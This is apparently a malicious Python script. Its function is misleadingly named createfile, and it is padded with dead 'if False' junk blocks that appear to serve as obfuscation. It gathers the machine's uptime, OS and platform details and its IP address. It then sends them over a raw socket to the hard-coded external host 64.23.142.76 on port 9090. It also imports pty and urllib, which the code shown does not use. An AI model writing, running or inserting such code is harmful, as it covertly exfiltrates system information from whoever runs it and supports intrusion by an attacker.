import socket
import urllib.request
import pty
import os

def createfile():
    from datetime import datetime
    if False:
        _var_118_0 = (532, 268, 473)
        _var_118_1 = (693, 179, 114)
        _var_118_2 = (889, 618, 27)

        def _var_118_fn():
            pass
    import platform
    import socket
    with open('/proc/uptime', 'r') as f:
        uptime = f.read().split(' ')[0].strip()
    uptime = int(float(uptime))
    uptime_minutes = uptime % 3600 // 60
    if False:
        _var_119_0 = (222, 783, 804)
        _var_119_1 = (238, 212, 731)

        def _var_119_fn():
            pass
    uptime_hours = uptime // 3600
    if False:
        _var_120_0 = (948, 175, 303)

        def _var_120_fn():
            pass
    uptime = 'Uptime : ' + str(uptime_hours) + ':' + str(uptime_minutes) + ' hours'
    if False:
        _var_121_0 = (475, 712, 869)

        def _var_121_fn():
            pass
    systeminfo = ('OS:', platform.release(), 'SysName:', platform.system(), 'OSVersion:', platform.version(), 'Platform:', platform.platform(), 'IPDetails:', socket.gethostbyname(socket.gethostname()))
    sendable_string = f'{uptime} --- {systeminfo}'
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    clientSocket.connect(('64.23.142.76', 9090))
    if False:
        _var_122_0 = (980, 714, 34)

        def _var_122_fn():
            pass
    clientSocket.send(str(sendable_string).encode())